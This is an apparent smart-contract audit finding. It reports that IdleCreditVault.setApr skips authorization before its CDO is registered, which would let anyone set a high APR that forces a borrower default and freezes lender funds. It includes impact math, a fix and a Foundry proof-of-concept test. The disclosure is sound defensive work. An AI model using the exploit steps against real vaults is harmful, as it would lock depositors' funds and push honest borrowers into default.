### Title
Unauthenticated APR manipulation before CDO registration can force borrower default and freeze lender funds - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol))

### Summary
`IdleCreditVault.setApr` skips its caller check whenever `idleCDO` is still unset. During that setup window, any account can replace both the scaled APR and `unscaledApr` through `setAprs`, even though APR updates are intended to be restricted to the CDO or manager. A vault initialized outside the factory’s atomic deployment path, or left unlinked to its CDO, can therefore be configured with an attacker-controlled borrower rate before deposits are accepted. [1](#0-0) 

### Finding Description
`setAprs` writes `unscaledApr` before delegating to `setApr`. `setApr` checks `msg.sender != idleCDO && msg.sender != manager` only when `idleCDO != address(0)`; otherwise any caller is accepted. The only remaining constraint is `maxApr`, which defaults to `20e18` during initialization. [2](#0-1) [1](#0-0) 

The CDO later uses `IdleCreditVault.getApr()`, which returns the attacker-controlled `lastApr`, to calculate `expectedEpochInterest` in `startEpoch`. At `stopEpoch`, the CDO tries to pull that expected interest plus pending withdrawals from the borrower. If the borrower only approved or holds the contractual amount, the pull fails and `_handleBorrowerDefault` pauses deposits, disables withdrawal requests, marks the pool defaulted, and stops the epoch. [3](#0-2) [4](#0-3) [5](#0-4) 

### Impact Explanation
An unprivileged attacker can permanently alter a newly initialized vault’s credit terms. For example, on a vault holding 1,000,000 USDC over a 30-day epoch, setting `lastApr` to the default maximum `20e18` makes the CDO demand approximately 16,438 USDC of epoch interest. If the negotiated rate was materially lower, an honest borrower with approval only for the negotiated amount fails the stop-epoch transfer, causing the vault to enter its default state. Depositor funds already sent to the borrower remain inaccessible until recovery is finalized, while withdrawals and deposits are disabled. This is a loss-of-availability condition with a quantified excess demand equal to the forged interest amount. [6](#0-5) [7](#0-6) 

### Likelihood Explanation
The vulnerability requires a non-atomic deployment/configuration sequence in which `initialize` has run but `setWhitelistedCDO` has not. The supplied factory mitigates this specific race by calling `setAprs` and `setWhitelistedCDO` in the same deployment transaction, so factory-deployed vaults are not exposed. However, the strategy itself is independently deployable and upgradeable, and the authorization bypass is embedded in production code rather than a test-only path. Once an attacker observes such a partially configured vault, the exploit needs one unprivileged transaction. [8](#0-7) 

### Recommendation
Do not exempt the pre-registration state from authorization. Set `idleCDO` during `initialize`, or add a dedicated deployer/configurator role and require `msg.sender == owner() || msg.sender == manager` until `idleCDO` is configured. Alternatively, make `setApr` revert whenever `idleCDO == address(0)` after initialization and perform initial APR setup only through initializer arguments.

### Proof of Concept

```solidity
import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
    "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVault} from
    "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";

contract UnauthenticatedAprPoC is Test {
    IdleCreditVault strategy;
    IdleCDOEpochVariant cdo;
    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    IERC20Detailed usdc = IERC20Detailed(address(/* forked USDC */));

    function testAnyoneCanSetAprBeforeCdoRegistration() public {
        IdleCreditVault impl = new IdleCreditVault();
        strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
            address(impl),
            address(this),
            abi.encodeWithSelector(
                IdleCreditVault.initialize.selector,
                address(usdc),
                owner,
                manager,
                borrower,
                "Borrower",
                5e18
            )
        )));

        assertEq(strategy.getApr(), 5e18);
        assertEq(strategy.idleCDO(), address(0));

        // Authorization is skipped because idleCDO is unset.
        vm.prank(attacker);
        strategy.setAprs(20e18, 20e18);

        assertEq(strategy.unscaledApr(), 20e18);
        assertEq(strategy.getApr(), 20e18);

        // Honest owner then links the CDO, unknowingly retaining the forged APR.
        IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
        cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
            address(cdoImpl),
            address(this),
            abi.encodeWithSelector(
                IdleCDOEpochVariant.initialize.selector,
                0,
                address(usdc),
                owner,
                owner,
                address(0),
                address(strategy),
                100_000
            )
        )));

        vm.prank(owner);
        strategy.setWhitelistedCDO(address(cdo));

        // After registration, attacker control ends, demonstrating that the prior
        // write was possible only through the missing pre-registration check.
        vm.prank(attacker);
        vm.expectRevert();
        strategy.setApr(0);
    }
}
```

On a funded fork test, depositing 1,000,000 USDC, starting a 30-day epoch, and stopping it makes the CDO request roughly `1,000,000 * 20% * 30 / 365 = 16,438.36` USDC of interest. A borrower approved only for the legitimate amount causes `getFundsFromBorrower` to fail and `_handleBorrowerDefault` to pause the pool and disable withdrawal requests.

```text
  /// @notice Handle borrower default
  function _handleBorrowerDefault(uint256 funds) internal {
    defaulted = true;
    // Do not reopen instant claims here. They remain disabled when funding is pending;
    // successful full funding is the only path that enables them before finalization.

    if (isProgrammableBorrower) {
      IProgrammableBorrower(_borrower()).onDefault();
    }

    // deposits should be already prevented
    if (!paused()) {
      _pause();
    }

    // stop the current epoch
    isEpochRunning = false;

    // prevent withdrawals requests
    allowAAWithdrawRequest = false;
    allowBBWithdrawRequest = false;

    emit BorrowerDefault(funds);
  }
```
